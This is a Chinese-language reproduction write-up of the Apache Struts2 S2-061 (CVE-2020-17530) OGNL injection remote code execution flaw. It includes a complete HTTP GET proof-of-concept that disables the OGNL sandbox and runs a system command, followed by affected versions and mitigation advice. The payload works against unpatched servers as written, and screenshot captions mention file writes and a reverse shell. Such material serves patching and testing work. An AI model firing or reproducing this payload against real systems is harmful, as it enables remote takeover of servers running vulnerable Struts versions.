## 漏洞描述

Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061
Struts
远程代码执行漏洞（CVE-2020-17530），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。本次漏洞是对S2-059漏洞修复后的绕过。S2-059的修复补丁仅修复了沙盒绕过，但是并没有修复OGNL表达式的执行。但是在最新版本2.5.26版本中OGNL表达式的执行也修复了。

此次漏洞只是S2-059修复的一个绕过，并且本次利用的核心类org.apache.commons.collections.BeanMap在commons-collections-x.x.jar包中，但是在官方的最小依赖包中并没有包含这个包。所以即使扫到了支持OGNL表达式的注入点，但是如果没有使用这个依赖包，也还是没办法进行利用。

## 漏洞复现

### poc

    
    
    GET /?id=%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{%27id%27}).(%23res%3d%23exec.exec(%23cmd))} HTTP/1.1
    Host: ip:8080
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Connection: close

读取id  
![](https://image.3001.net/images/20201212/1607781934_5fd4ce2e64d43708aaed2.jpg!small)

写文件

![](https://image.3001.net/images/20201212/1607782092_5fd4cecc52618e1136439.jpg!small)

![](https://image.3001.net/images/20201212/1607782133_5fd4cef5022bb88cefd91.jpg!small)

测试dnslog

![](https://image.3001.net/images/20201212/1607781963_5fd4ce4bceeeec464a22c.jpg!small)反弹shell

![](https://image.3001.net/images/20201212/1607781994_5fd4ce6a3521317cf71c5.jpg!small)

  

## 复现视频

[https://mp.weixin.qq.com/s/UwDEhLS8aDF4oLADLom6aA﻿](https://mp.weixin.qq.com/s/UwDEhLS8aDF4oLADLom6aA)

  

## 影响版本

Apache Struts 2.0.0 - 2.5.25

## 安全建议

（1）将Apache Struts框架升级至最新版本。

（2）或者开启ONGL表达式注入保护措施，过滤%{}表达式

(<https://struts.apache.org/security/#proactively-protect-from-ognl-expression-injections-attacks-if-easily-applicable>)

(3)在部署环境时建议使用最小化部署，使用最小包进行部署，避免出现漏洞。

  

  

## 参考链接

我们不是创造者，我们只是搬运工！

<https://mp.weixin.qq.com/s/ON4NCkEp0N0qKGfaJrUbbw>

<https://mp.weixin.qq.com/s/UwDEhLS8aDF4oLADLom6aA>

<https://cwiki.apache.org/confluence/display/WW/S2-061>

<https://mp.weixin.qq.com/s/PhhgnrmOc5MKxS--ZJNaCQ>

<https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.26>

<https://mp.weixin.qq.com/s/XBU3wwlHdoGEjNCd0J7GLQ>

<https://mp.weixin.qq.com/s/6yDtri_M9utZNIZqOrFafQ>

